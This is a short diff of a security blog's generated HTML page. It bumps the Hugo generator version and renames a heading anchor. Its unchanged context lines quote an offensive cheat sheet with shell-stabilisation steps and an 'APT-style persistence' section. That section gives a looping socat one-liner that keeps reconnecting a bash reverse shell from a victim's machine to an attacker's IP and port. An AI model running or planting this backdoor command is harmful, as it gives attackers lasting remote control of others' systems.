@@ -89,7 +89,7 @@
 <script src="https://bananamafia.dev/js/bootstrap.min.js"></script>
 
 
-<script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script> <meta name="generator" content="Hugo 0.60.1" />
+<script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script> <meta name="generator" content="Hugo 0.62.0" />
         
 
         
@@ -215,7 +215,7 @@
 <li>Using a new terminal, execute <code>stty -a</code> to display the amount of columns and rows being used normally on the attackers machine.</li>
 <li>In the (<code>socat</code>) shell use <code>stty rows &lt;num&gt; cols &lt;num&gt;</code> to fix the width.</li>
 </ol>
-<h1 id="aptstyle-persistence">APT-style persistence</h1>
+<h1 id="apt-style-persistence">APT-style persistence</h1>
 <p>Create a lazy backdoor shell on the victims machine:</p>
 <pre><code>while true; do sleep 10; socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:&lt;IP&gt;:&lt;PORT&gt;; done &amp;
 </code></pre><p>In case a previous shell breaks, just set up a new listener to be up and running again without the need to run an exploit again. Or use <a href="https://github.com/creaktive/tsh">tsh</a></p>
